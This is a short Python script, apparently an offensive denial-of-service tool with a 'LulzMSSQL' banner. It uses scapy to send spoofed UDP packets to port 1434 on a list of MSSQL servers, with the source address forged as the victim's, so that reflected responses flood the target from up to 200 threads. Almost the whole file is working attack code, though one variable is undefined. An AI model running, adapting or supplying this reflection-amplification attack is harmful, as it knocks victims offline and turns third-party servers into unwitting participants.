import threading, sys, os, time
from random import randint
from scapy.all import *

data = "\x02"

mssql_amps = []
with open('mssql.txt', 'r') as mssql_file:
    [mssql_amps.append(mssql_server.strip('\n')) for mssql_server in mssql_file.readlines()]

def flood():
    host = sys.argv[2]
    duration = sys.argv[3]

    stoptime = time.time() + int(duration)
    while time.time() < stoptime:
        try:

            ip = IP(dst=choice(mssql_amps),src=target)
            udp = UDP(sport=44206,dport=1434)
            raw = Raw(load=data) 

            send(ip/udp/raw, verbose=0)
        except KeyboardInterrupt:
            os.kill(os.getpid(), 9)
        except Exception:
            pass
        
if __name__ == '__main__':
    print('''
             /$$                 /$$           /$$      /$$  /$$$$$$   /$$$$$$   /$$$$$$  /$$      
            | $$                | $$          | $$$    /$$$ /$$__  $$ /$$__  $$ /$$__  $$| $$      
            | $$       /$$   /$$| $$ /$$$$$$$$| $$$$  /$$$$| $$  \__/| $$  \__/| $$  \ $$| $$      
            | $$      | $$  | $$| $$|____ /$$/| $$ $$/$$ $$|  $$$$$$ |  $$$$$$ | $$  | $$| $$      
            | $$      | $$  | $$| $$   /$$$$/ | $$  $$$| $$ \____  $$ \____  $$| $$  | $$| $$      
            | $$      | $$  | $$| $$  /$$__/  | $$\  $ | $$ /$$  \ $$ /$$  \ $$| $$/$$ $$| $$      
            | $$$$$$$$|  $$$$$$/| $$ /$$$$$$$$| $$ \/  | $$|  $$$$$$/|  $$$$$$/|  $$$$$$/| $$$$$$$$
            |________/ \______/ |__/|________/|__/     |__/ \______/  \______/  \____ $$$|________/
                                                                                    \__/
    ''')

    try:
        threadcount = 200 if int(sys.argv[1]) > 200 else int(sys.argv[1])

        for _ in range(threadcount):
            threading.Thread(target=flood).start()
    except:
        print('error')